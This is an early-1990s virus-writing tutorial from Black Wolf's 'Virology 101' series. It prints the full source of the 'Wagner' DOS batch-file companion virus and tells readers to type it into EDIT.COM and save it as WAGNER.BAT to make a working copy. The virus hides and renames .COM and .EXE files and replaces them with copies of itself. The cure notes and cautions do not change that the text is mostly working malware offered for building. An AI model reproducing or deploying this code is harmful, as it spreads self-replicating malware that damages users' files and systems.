      Black Wolf (AKA Stormbringer) Virology 101                  

                  Batch File Viruses

 
 
    
            Batch File viruses are becoming increasingly common, because o
       two main reasons: 1) They are incredibly simple to write and requir
       no real programming experience, and 2) There are a growing number o
       programs that will convert .BAT files into .COM and/or .EXE files.
       This allows the batch file to pose as an executable and prevents it
       from being typed. The following virus, however, works in BAT format
       It searches the directory for .COM files and .EXE files, finding th
       last one in the directory.  It then renames it to its name with a V
       at the beginning, hides it, and puts a batch file with the same nam
       into the directory that contains the virus.  The commands used can
       be found in an MS-DOS User's Manual.  To cure it, read the
       instructions within the virus itself simply by typing one of the
       infected .BAT files.  This, despite the fact that it is not an
       'executable' program, is a virus and, like all others, can cause
       damage if improperly handled.  It will not go out of the directory,
       unless it is run from another directory. As with anything that is
       potentially dangerous, just be careful and use common sense.  And
       if you do not understand it, DO NOT PRESS YOUR LUCK BY PLAYING WITH
       IT!  Study the code and an MS-DOS manual until you do understand
       it.  I am not including an in-depth study of this virus due to its
       simplicity.  To create a working version of this virus, type the
       code in between the dotted lines into a program such as EDIT.COM
       that comes with DOS, and save it as WAGNER.BAT. Put it in an
       isolated directory, and then you can test it.  Again, be careful,
       for it is YOUR responsibility for anything you do with it.
    
                               The Wagner Virus
    
       --------------------------------Code-------------------------------
       @echo off
       ctty nul
       rem  ______________________________________________________________
       rem :Wagner Virus, as presented in Virology 101 (c) 1993 Black Wolf
       rem :This virus can be cured simply by typing "attrib -h -r *.*" in
       rem :infected directories and deleting BAT files that are identical
       rem :to this code, then rename the files having a "V" at the start
       rem :to their original names.   NOTE: Does not infect COMMAND.COM.
       rem :______________________________________________________________
       for %%f in (*.exe *.com) do set A=%%f
       if %A%==COMMAND.COM set A=
       rename %A% V%A%
       if not exist V%A% goto end
       attrib +h V%A%
       copy %0.bat %A%
       attrib +r %A%
       ren %A% *.bat
       set A=
       :end
       ctty con
       @if exist V%0.com V%0.com %1 %2 %3
       @if exist V%0.exe V%0.exe %1 %2 %3
       ----------------------------End of Code----------------------------
